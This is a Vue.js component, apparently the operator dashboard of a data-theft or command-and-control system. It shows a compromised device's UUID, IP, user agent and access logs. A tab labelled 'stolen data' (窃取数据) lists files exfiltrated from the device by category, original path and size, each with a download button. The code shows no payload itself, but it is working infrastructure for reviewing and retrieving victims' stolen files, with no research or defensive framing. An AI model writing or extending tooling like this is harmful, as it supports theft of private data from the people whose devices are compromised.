<template>
  <div class="device-detail">
    <el-button @click="$router.back()" style="margin-bottom: 20px;">返回</el-button>
    
    <el-card title="设备信息" v-if="device">
      <el-descriptions :column="2">
        <el-descriptions-item label="设备UUID">{{ device.device_uuid }}</el-descriptions-item>
        <el-descriptions-item label="IP地址">{{ device.ip }}</el-descriptions-item>
        <el-descriptions-item label="首次访问">{{ device.first_seen }}</el-descriptions-item>
        <el-descriptions-item label="最后访问">{{ device.last_seen }}</el-descriptions-item>
        <el-descriptions-item label="状态">
          <el-tag :type="device.status === 'active' ? 'success' : 'info'">
            {{ device.status === 'active' ? '活跃' : '离线' }}
          </el-tag>
        </el-descriptions-item>
        <el-descriptions-item label="User Agent">{{ device.user_agent }}</el-descriptions-item>
      </el-descriptions>
    </el-card>
    
    <el-tabs style="margin-top: 20px;">
      <el-tab-pane label="访问日志">
        <el-table :data="logs" border>
          <el-table-column prop="timestamp" label="时间" width="180" />
          <el-table-column prop="method" label="方法" width="80" />
          <el-table-column prop="path" label="路径" />
          <el-table-column prop="status_code" label="状态码" width="100" />
        </el-table>
      </el-tab-pane>
      <el-tab-pane label="窃取数据">
        <el-table :data="exfil" border>
          <el-table-column prop="category" label="类别" width="120" />
          <el-table-column prop="path" label="原始路径" />
          <el-table-column prop="file_size" label="大小" width="100" />
          <el-table-column prop="uploaded_at" label="上传时间" width="180" />
          <el-table-column label="操作" width="100">
            <template #default="scope">
              <el-button size="small" @click="downloadExfil(scope.row.id)">下载</el-button>
            </template>
          </el-table-column>
        </el-table>
      </el-tab-pane>
    </el-tabs>
  </div>
</template>

<script setup>
import { ref, onMounted } from 'vue'
import { useRoute } from 'vue-router'
import axios from '../utils/axios'

const route = useRoute()
const device = ref(null)
const logs = ref([])
const exfil = ref([])

async function loadDevice() {
  try {
    const response = await axios.get(`/api/devices/${route.params.uuid}`)
    device.value = response.data
  } catch (error) {
    console.error('加载设备信息失败:', error)
  }
}

async function loadDeviceLogs() {
  try {
    const response = await axios.get(`/api/devices/${route.params.uuid}/logs`)
    logs.value = response.data
  } catch (error) {
    console.error('加载设备日志失败:', error)
  }
}

async function loadDeviceExfil() {
  try {
    const response = await axios.get(`/api/devices/${route.params.uuid}/exfil`)
    exfil.value = response.data
  } catch (error) {
    console.error('加载设备数据失败:', error)
  }
}

async function downloadExfil(id) {
  try {
    const response = await axios.get(`/api/exfil/${id}/download`, { responseType: 'blob' })
    const url = window.URL.createObjectURL(new Blob([response.data]))
    const link = document.createElement('a')
    link.href = url
    link.setAttribute('download', `exfil_${id}.bin`)
    document.body.appendChild(link)
    link.click()
    link.remove()
  } catch (error) {
    console.error('下载文件失败:', error)
  }
}

onMounted(async () => {
  await loadDevice()
  await loadDeviceLogs()
  await loadDeviceExfil()
})
</script>
